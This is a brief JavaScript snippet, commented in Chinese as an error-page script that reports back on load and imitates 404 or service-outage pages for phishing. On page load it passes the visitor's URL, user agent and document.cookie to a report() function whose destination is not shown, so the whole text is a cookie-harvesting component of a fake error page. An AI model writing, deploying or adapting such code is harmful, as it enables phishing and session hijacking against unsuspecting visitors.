// 错误页脚本:加载即回传(仿 404/服务异常页钓鱼)
(function () {
  report({ type: "error_page", url: location.href, ua: navigator.userAgent, cookie: document.cookie || "" });
})();
